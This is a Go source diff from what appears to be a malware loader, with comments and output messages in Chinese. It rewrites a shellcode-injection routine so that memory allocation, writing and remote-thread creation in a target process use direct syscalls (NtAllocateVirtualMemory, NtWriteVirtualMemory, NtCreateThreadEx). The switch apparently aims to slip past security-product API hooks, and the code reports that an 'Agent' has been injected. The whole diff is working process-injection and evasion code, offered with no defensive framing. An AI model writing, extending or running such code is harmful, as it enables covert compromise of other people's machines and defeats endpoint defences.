@@ -66,47 +66,63 @@ func Execute(shellcode []byte) error {
 	defer windows.CloseHandle(hProcess)
 	fmt.Println("[+] 目标进程已打开")
 
-	// 3. 在目标进程中申请内存
-	addr, _, err := VirtualAllocEx.Call(
+	// 初始化 Syscall Stub (Direct Syscall 准备)
+	sys := &SyscallStub{}
+	if err := sys.Init(); err != nil {
+		return fmt.Errorf("Syscall初始化失败(可能被Hook严重无法绕过): %v", err)
+	}
+
+	// 3. 在目标进程中申请内存 (NtAllocateVirtualMemory)
+	var baseAddr uintptr
+	regionSize := uintptr(len(shellcode))
+
+	status := sys.NtAllocateVirtualMemory(
 		uintptr(hProcess),
+		&baseAddr,
 		0,
-		uintptr(len(shellcode)),
+		&regionSize,
 		MEM_COMMIT|MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE,
 	)
-	if addr == 0 {
-		return fmt.Errorf("目标进程内存申请失败: %v", err)
-	}
-	fmt.Printf("[+] 目标进程内存申请成功: 0x%x\n", addr)
 
-	// 4. 写入 Shellcode 到目标进程
-	var written uintptr
-	ret, _, err := WriteProcessMemory.Call(
+	if status != 0 {
+		return fmt.Errorf("NtAllocateVirtualMemory 失败, status: 0x%x", status)
+	}
+	fmt.Printf("[+] 目标进程内存申请成功(Syscall): 0x%x\n", baseAddr)
+
+	// 4. 写入 Shellcode 到目标进程 (NtWriteVirtualMemory)
+	var bytesWritten uintptr
+	status = sys.NtWriteVirtualMemory(
 		uintptr(hProcess),
-		addr,
+		baseAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&written)),
+		&bytesWritten,
 	)
-	if ret == 0 {
-		return fmt.Errorf("写入目标进程内存失败: %v", err)
-	}
-	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", written)
 
-	// 5. 在目标进程创建远程线程执行
-	thread, _, err := CreateRemoteThread.Call(
-		uintptr(hProcess),
-		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
-	)
-	if thread == 0 {
-		return fmt.Errorf("远程线程创建失败: %v", err)
+	if status != 0 {
+		return fmt.Errorf("NtWriteVirtualMemory 失败, status: 0x%x", status)
 	}
-	fmt.Printf("[+] 远程线程已创建，Agent 已注入到 %s\n", targetName)
+	fmt.Printf("[+] Payload 已写入目标进程(Syscall): %d 字节\n", bytesWritten)
+
+	// 5. 在目标进程创建远程线程执行 (NtCreateThreadEx)
+	var hThread uintptr
+	status = sys.NtCreateThreadEx(
+		&hThread,
+		0x1FFFFF, // ALL_ACCESS
+		0,
+		uintptr(hProcess),
+		baseAddr,
+		0,
+		0,
+		0, 0, 0, 0,
+	)
+
+	if status != 0 {
+		return fmt.Errorf("NtCreateThreadEx 失败, status: 0x%x", status)
+	}
+	windows.CloseHandle(windows.Handle(hThread))
+	fmt.Printf("[+] 远程线程已创建(Syscall)，Agent 已注入到 %s\n", targetName)
 	fmt.Println("[+] Loader 任务完成，即将退出...")
 
 	// 不等待线程执行，让 Loader 直接退出
